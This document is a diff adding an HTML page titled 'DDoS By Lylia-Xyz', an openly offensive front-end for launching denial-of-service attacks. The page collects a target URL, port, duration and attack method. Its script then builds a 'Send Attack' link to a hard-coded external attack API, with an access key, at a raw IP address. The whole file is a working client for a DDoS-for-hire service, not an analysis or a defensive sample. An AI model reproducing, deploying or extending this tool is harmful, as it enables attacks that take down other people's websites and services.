@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DDoS By Lylia-Xyz</title>
+  <style>
+    body {
+      background-color: #ccc;
+      font-family: Arial, sans-serif;
+      padding: 20px;
+    }
+    .container {
+      background-image: url("https://files.catbox.moe/l239zh.jpg");
+      max-width: 500px;
+      margin: auto;
+      background: white;
+      background-repeat: no-repeat;
+        background-size: cover;
+        width: 100%;
+    }
+    h1 {
+      text-align: center;
+    }
+    label {
+      display: block;
+      margin-top: 15px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      width: 100%;
+      margin-top: 20px;
+      padding: 10px;
+      background-color: red;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-block;
+    }
+    .result {
+      margin-top: 20px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Lylia-Xyz Attack 😈</h1>
+    <label for="host">URL</label>
+    <input type="text" id="host" placeholder="https://example.com">
+
+    <label for="port">PORT</label>
+    <input type="text" id="port" placeholder="443">
+
+    <label for="time">TIME</label>
+    <input type="text" id="time" placeholder="60">
+
+    <label for="method">ATTACK METHOD</label>
+    <input type="text" id="method" placeholder="blast">
+
+    <button onclick="generateLink()">Attack Now 😈</button>
+
+    <div class="result" id="result"></div>
+  </div>
+
+  <script>
+    function generateLink() {
+      const host = document.getElementById('host').value;
+      const port = document.getElementById('port').value;
+      const time = document.getElementById('time').value;
+      const method = document.getElementById('method').value;
+
+      if (!host || !port || !time || !method) {
+        alert('Harap isi semua data Untuk Melanjutkan.');
+        return;
+      }
+
+      const baseUrl = 'http://174.138.26.59/:2033/api/Matzz';
+      const fullUrl = `${baseUrl}?key=Matzz&host=${encodeURIComponent(host)}&port=${port}&time=${time}&method=${encodeURIComponent(method)}`;
+
+      document.getElementById('result').innerHTML = `
+        <a href="${fullUrl}" target="_blank" class="button" style="background-color: green; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; display: inline-block;">Send Attack</a>
+      `;
+    }
+  </script>
+</body>
+</html>
